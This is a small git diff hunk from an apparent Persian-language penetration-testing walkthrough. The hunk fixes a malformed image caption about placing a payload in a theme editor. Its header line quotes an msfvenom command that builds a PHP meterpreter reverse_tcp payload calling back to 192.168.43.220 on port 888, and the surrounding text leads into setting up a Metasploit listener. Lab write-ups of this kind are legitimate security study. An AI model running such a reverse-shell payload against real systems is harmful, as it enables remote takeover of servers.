@@ -155,7 +155,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.220 LPORT=888 -f raw
 
 بعد از ذخیره تغییرات، آماده بودم بررسی کنم که آیا درخواست به فایل تغییر‌یافته می‌تونه Payload رو اجرا کنه یا نه.
 
-![قرار دادن Payload در ویرایشگر پوست(screenshots/edited.png)
+![قرار دادن Payload در ویرایشگر پوسته](screenshots/edited.png)
 
 ## راه‌اندازی Listener در Metasploit
 
